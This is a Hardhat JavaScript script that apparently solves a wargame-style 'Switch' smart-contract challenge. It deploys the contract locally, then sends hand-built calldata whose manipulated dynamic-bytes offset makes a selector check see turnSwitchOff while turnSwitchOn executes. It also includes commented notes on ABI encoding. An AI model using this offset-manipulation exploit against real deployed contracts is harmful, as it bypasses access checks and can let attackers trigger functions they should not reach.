
const hre = require("hardhat");


function printData(data) {
    for (let i = 2; i < data.length; i += 64) {
        // print storage slot also on each line, eg. 0x000, 0x020, 0x040, ... which increment in 32 bytes
        console.log("0x" + ((i - 2)/2).toString(16).padStart(3, "0") + ":", data.slice(i, i + 64));
    }
}

async function main() {

    const [deployer, signer0, signer1] = await hre.ethers.getSigners();
    console.log(deployer.address, signer0.address, signer1.address);

    // const contract = await hre.ethers.getContractAt("Switch", "0xE297645F0a87feC9d8b080B81CEF3C64E5aBB985", signer0);
    const contract = await hre.ethers.deployContract("Switch", deployer);
    console.log("Contract deployed to address:", contract.address);
    console.log("Contract switch:", await contract.switchOn());

    const selectorOff = contract.interface.getSighash("turnSwitchOff()");
    const selectorOn = contract.interface.getSighash("turnSwitchOn()");
    const flipSwitch = contract.interface.getSighash("flipSwitch(bytes)")

    console.log("selectorOff:", selectorOff);
    console.log("selectorOn:", selectorOn);
    console.log("flipSwitch(bytes):", flipSwitch);
  
    // await contract.flipSwitch(selectorOff);
    const calldata1 = "0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000";
    console.log("Switch off");
    printData("0x" + calldata1.slice(10,));

    // await contract.flipSwitch(selectorOn);
    const calldata2 = "0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
    console.log("Switch on");
    printData("0x" + calldata2.slice(10, ));

    const attackCalldata = "0x30c13ade" + "0000000000000000000000000000000000000000000000000000000000000060" + "0000000000000000000000000000000000000000000000000000000000000004" + "20606e1500000000000000000000000000000000000000000000000000000000" + "0000000000000000000000000000000000000000000000000000000000000004" + "76227e1200000000000000000000000000000000000000000000000000000000";
    console.log("Attack");
    printData("0x" + attackCalldata.slice(10, ));

    const txn = await deployer.sendTransaction({
        to: contract.address,
        data: attackCalldata
    });
    await txn.wait();

    console.log("Contract switch:", await contract.switchOn());



    /* Tests to understand dynamic calldata */

    // const testContract = await hre.ethers.deployContract("TestSwitch", signer0);
    // const data1 = await testContract.testEmptyParams();
    // console.log("testEmptyParams");
    // printData(data1);

    /*
    0x000: 0000000000000000000000000000000000000000000000000000000000000020 
    - head of the CreateOrderParams struct, pointing to the tail which is the actual encode of the struct
    0x020: 00000000000000000000000000000000000000000000000000000000000000c0 
    - head of CreateOrderAddressParams which is the first field of CreateOrderParams, 
    so if we add 0xc0 to 0x20 we get the tail of the CreateOrderAddressParams struct = 0xe0
    (we have to add the offset to where the encoding starts which is the beginning of the tail of the CreateOrderParams struct)
    0x040: 0000000000000000000000000000000000000000000000000000000000000000
    - CreateOrderNumberParams is not dynamic, so it's just the encoding of the uint256 number, there is no tail, this is directly uint256 d
    0x060: 0000000000000000000000000000000000000000000000000000000000000000
    - should be uint256 e
    0x080: 0000000000000000000000000000000000000000000000000000000000000000
    - should be uint256 f
    0x0a0: 0000000000000000000000000000000000000000000000000000000000000000
    - should be uint256 g
    0x0c0: 0000000000000000000000000000000000000000000000000000000000000000
    - should be bool h
    0x0e0: 0000000000000000000000000000000000000000000000000000000000000000
    - should be address a
    0x100: 0000000000000000000000000000000000000000000000000000000000000000
    - should be address b
    0x120: 0000000000000000000000000000000000000000000000000000000000000060
    - here address[] c starts which is dynamic, so this is the head
    we have to add this offset to the beginning of the encoding of the struct, ie. the beginning of the tail of CreateOrderAddressParams struct,
    so we add 0x60 to 0xe0 to get the tail of the address[] c = 0x140
    0x140: 0000000000000000000000000000000000000000000000000000000000000000
    - here the address[] c starts, so this should be length of the array which is currently 0

    */

    // const data2 = await testContract.testFilledParams();
    // console.log("testFilledParams");
    // printData(data2);

    /*

    0x000: 0000000000000000000000000000000000000000000000000000000000000020
    0x020: 00000000000000000000000000000000000000000000000000000000000000c0
    0x040: 0000000000000000000000000000000000000000000000000000000000000005 - d
    0x060: 0000000000000000000000000000000000000000000000000000000000000006 - e
    0x080: 0000000000000000000000000000000000000000000000000000000000000007 - f
    0x0a0: 0000000000000000000000000000000000000000000000000000000000000008 - g
    0x0c0: 0000000000000000000000000000000000000000000000000000000000000001 - h
    0x0e0: 0000000000000000000000000000000000000000000000000000000000000001 - a
    0x100: 0000000000000000000000000000000000000000000000000000000000000002 - b
    0x120: 0000000000000000000000000000000000000000000000000000000000000060 
    0x140: 0000000000000000000000000000000000000000000000000000000000000002 - length of c
    0x160: 0000000000000000000000000000000000000000000000000000000000000003 - c[0]
    0x180: 0000000000000000000000000000000000000000000000000000000000000004 - c[1]

    */

}


main()